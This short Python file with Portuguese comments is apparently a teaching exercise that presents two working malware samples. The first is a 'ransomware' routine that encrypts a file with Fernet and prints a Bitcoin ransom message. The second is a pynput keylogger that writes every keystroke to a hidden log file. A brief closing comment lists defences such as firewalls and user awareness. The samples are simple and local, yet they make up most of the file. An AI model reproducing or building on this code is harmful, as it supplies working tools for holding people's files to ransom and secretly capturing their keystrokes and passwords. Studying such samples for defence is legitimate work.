#RANSOMWARE

from cryptography.fernet import Fernet
import os

# Passo 1: Gerar uma chave de "resgate"
chave = Fernet.generate_key()
with open("chave.key", "wb") as key_file:
    key_file.write(chave)

fernet = Fernet(chave)

# Passo 2: Criar um arquivo de teste e criptografar
with open("meu_trabalho.txt", "w") as f:
    f.write("Este e um documento super importante!")

with open("meu_trabalho.txt", "rb") as f:
    dados = f.read()

dados_criptografados = fernet.encrypt(dados)

with open("meu_trabalho.txt", "wb") as f:
    f.write(dados_criptografados)

print("ARQUIVOS CRIPTOGRAFADOS!")
print("Mensagem: Seus arquivos sumiram! Pague 1 bitcon para recuperar.")

#KEYLOGGER

from pynput.keyboard import Listener

log_file = "logs_secreto.txt"

def ao_pressionar(tecla):
    # Transforma a tecla em string e salva no arquivo
    with open(log_file, "a") as f:
        f.write(str(tecla).replace("'", "") + " ")

# Inicia o monitoramento
with Listener(on_press=ao_pressionar) as listener:
    listener.join()

#DEFESAS
#
#Firewall: Bloquearia o Keylogger de tentar enviar o arquivo de log para um servidor externo
#Conscientização: Nunca clicar em links de e-mails estranhos que baixam esses scripts sem a gente ver
